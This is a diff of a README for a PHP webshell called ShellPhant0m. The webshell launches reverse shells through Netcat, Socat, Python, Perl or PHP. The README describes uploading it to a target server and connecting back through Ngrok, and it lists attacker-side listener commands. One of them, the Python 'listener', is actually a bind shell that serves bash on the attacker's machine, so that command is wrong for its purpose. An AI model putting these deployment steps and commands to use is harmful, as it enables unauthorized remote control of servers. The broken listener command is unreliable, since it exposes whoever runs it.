@@ -1,52 +1,64 @@
 # ShellPhant0m
 
-**ShellPhant0m** is a lightweight PHP webshell with a built-in reverse shell launcher. It provides an interactive dropdown interface to trigger reverse connections using either Netcat or Socat, directly from the web interface.
+**ShellPhant0m** is a lightweight PHP webshell with a built-in reverse shell launcher. It provides an interactive interface to trigger reverse connections using multiple methods and shell types.
+
 ---
 
 <img width="770" height="431" alt="image" src="https://github.com/user-attachments/assets/833e2bcc-0ac5-4008-8010-07be8cf050d8" />
 
-
 ## Features
 
 - Single-file PHP shell for remote deployment
-- Supports both Netcat and Socat reverse shell connections
+- Multiple reverse shell methods:
+  - Netcat (nc)
+  - Socat
+  - Python
+  - Perl
+  - PHP
+- Configurable shell selection (/bin/bash, /bin/sh, /sbin/sh)
+- Dark theme interface with copy-to-clipboard functionality
+- Dynamic port configuration for listener commands
 - Accepts Ngrok or TCP address directly
 - Auto-parses the host and port
-- Displays listener command to be run on attacker's machine
 
 ## Requirements
 
 - PHP-enabled web server (e.g., Apache, Nginx with PHP)
 - A public listener (Ngrok, VPS, port-forwarded server)
+- Target system with required tools (nc, socat, python, perl, or php)
 
 ## Usage
 
-1. Upload `ShellPhant0m.php` to the target server.
-2. Access the shell via browser.
-3. Choose either **Netcat** or **Socat** from the dropdown menu.
-4. Paste your Ngrok or TCP address (e.g., `0.tcp.ap.ngrok.io:12345`).
-5. Click **Connect** to trigger the reverse shell.
+1. Upload `ShellPhant0m.php` to the target server
+2. Access the shell via browser
+3. Choose connection method from the dropdown menu
+4. Select preferred shell type (/bin/bash, /bin/sh, /sbin/sh)
+5. Paste your Ngrok or TCP address (e.g., `0.tcp.ap.ngrok.io:12345`)
+6. Click **Launch Shell** to trigger the reverse shell
 
 ### Example Ngrok Setup
 
 ```bash
 ngrok tcp 4444
-````
+```
 
-Paste the generated address (e.g., `0.tcp.ap.ngrok.io:12345`) into PhantomShell.
+### Example Listener Commands
 
-### Example Listener (on your machine)
+All listener commands are provided in the interface with copy buttons. Default examples:
 
-For **Netcat**:
-
+**Netcat:**
 ```bash
 nc -lvnp 4444
 ```
 
-For **Socat**:
-
+**Socat:**
 ```bash
-socat -d -d tcp-l:4444,reuseaddr,fork exec:/bin/bash,pty,stderr,setsid,sigint,sane
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+
+**Python:**
+```bash
+python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"0.0.0.0\",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"
 ```
 
 ## Disclaimer
@@ -54,4 +66,4 @@ socat -d -d tcp-l:4444,reuseaddr,fork exec:/bin/bash,pty,stderr,setsid,sigint,sa
 This tool is intended for **educational** and **authorized security testing** purposes only. Do not use it on systems you do not own or have explicit permission to test.
 
 ---
-Anu by : [AndKnownMaly](https://github.com/andknownmaly)
+Created by: [AndKnownMaly](https://github.com/andknownmaly)
